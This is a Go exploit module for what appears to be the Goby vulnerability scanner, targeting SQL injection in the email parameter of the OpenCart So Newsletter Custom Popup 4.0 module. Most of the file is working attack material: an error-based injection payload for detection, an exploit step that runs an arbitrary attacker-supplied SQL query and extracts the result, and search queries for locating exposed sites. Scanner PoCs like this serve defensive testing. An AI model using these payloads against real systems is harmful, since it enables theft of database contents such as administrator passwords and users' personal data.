package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "OpenCart So Newsletter Custom Popup 4.0 module email parameter SQL injection vulnerability",
    "Description": "<p>The OpenCart Newsletter Custom Popup module is a module for newsletter subscriptions.</p><p>There is a SQL injection vulnerability in the email parameter of the extension/module/so_newletter_custom_popup/newsletter interface of the Opencart Newsletter Custom Popup 4.0 module due to improper filtering.</p>",
    "Product": "OpenCart",
    "Homepage": "https://www.opencart.com/index.php?route=marketplace/extension/info&extension_id=40259&filter_search=newsletter&filter_license=1&sort=date_added",
    "DisclosureDate": "2022-09-18",
    "Author": "sharecast",
    "FofaQuery": "body=\"extension/module/so_newletter_custom_popup/newsletter\"",
    "GobyQuery": "body=\"extension/module/so_newletter_custom_popup/newsletter\"",
    "Level": "2",
    "Impact": "<p>In addition to using SQL injection vulnerabilities to obtain information in the database (for example, the administrator's back-end password, the user's personal information of the site), an attacker can write a Trojan horse to the server even in a high-privileged situation to further obtain server system permissions.</p>",
    "Recommendation": "<p>At present, the manufacturer has released a patch, please update it in time:</p><p><a href=\"https://www.opencart.com/index.php?route=marketplace/extension/infoextension_id=40259filter_search=newsletterfilter_license=1sort=date_added\">https://www.opencart.com/index.php?route=marketplace/extension/infoextension_id=40259filter_search=newsletterfilter_license=1sort=date_added</a></p><p><a href=\"https://www.opencartextensions.in/opencart-multi-vendor-multi-seller-marketplace\"></a></p>",
    "References": [
        "https://packetstormsecurity.com/files/168412/OpenCart-3.x-Newsletter-Custom-Popup-4.0-SQL-Injection.html"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "sql",
            "type": "input",
            "value": "select+database()",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/index.php?route=extension/module/so_newletter_custom_popup/newsletter",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "createdate=2022-8-28 19:4:6&email=hi' AND (SELECT 4828 FROM(SELECT COUNT(*),CONCAT(0x7e,(SELECT md5(0x5c)),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)#&status=0"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "28d397e87306b8631f3ed80d858d35f0",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/index.php?route=extension/module/so_newletter_custom_popup/newsletter",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "createdate=2022-8-28 19:4:6&email=hi' AND (SELECT 4828 FROM(SELECT COUNT(*),CONCAT(0x7e,({{{sql}}}),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)#&status=0"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|~(.*?)~"
            ]
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "OpenCart So Newsletter Custom Popup 4.0 模块 email 参数 SQL 注入漏洞",
            "Product": "OpenCart",
            "Description": "<p>OpenCart Newsletter Custom Popup模块是一个用于时事通讯订阅的模块。</p><p>在Opencart Newsletter Custom Popup 4.0模块&nbsp;extension/module/so_newletter_custom_popup/newsletter 接口的email参数由于过滤不当导致存在SQL注入漏洞。</p>",
            "Recommendation": "<p>目前厂商已经发布补丁，请及时进行更新：</p><p><a href=\"https://www.opencart.com/index.php?route=marketplace/extension/infoextension_id=40259filter_search=newsletterfilter_license=1sort=date_added\">https://www.opencart.com/index.php?route=marketplace/extension/infoextension_id=40259filter_search=newsletterfilter_license=1sort=date_added</a></p>",
            "Impact": "<p>攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "OpenCart So Newsletter Custom Popup 4.0 module email parameter SQL injection vulnerability",
            "Product": "OpenCart",
            "Description": "<p>The OpenCart Newsletter Custom Popup module is a module for newsletter subscriptions.</p><p>There is a SQL injection vulnerability in the email parameter of the extension/module/so_newletter_custom_popup/newsletter interface of the Opencart Newsletter Custom Popup 4.0 module due to improper filtering.</p>",
            "Recommendation": "<p>At present, the manufacturer has released a patch, please update it in time:</p><p><a href=\"https://www.opencart.com/index.php?route=marketplace/extension/infoextension_id=40259filter_search=newsletterfilter_license=1sort=date_added\">https://www.opencart.com/index.php?route=marketplace/extension/infoextension_id=40259filter_search=newsletterfilter_license=1sort=date_added</a></p><p><a href=\"https://www.opencartextensions.in/opencart-multi-vendor-multi-seller-marketplace\"></a></p>",
            "Impact": "<p>In addition to using SQL injection vulnerabilities to obtain information in the database (for example, the administrator's back-end password, the user's personal information of the site), an attacker can write a Trojan horse to the server even in a high-privileged situation to further obtain server system permissions.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10767"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}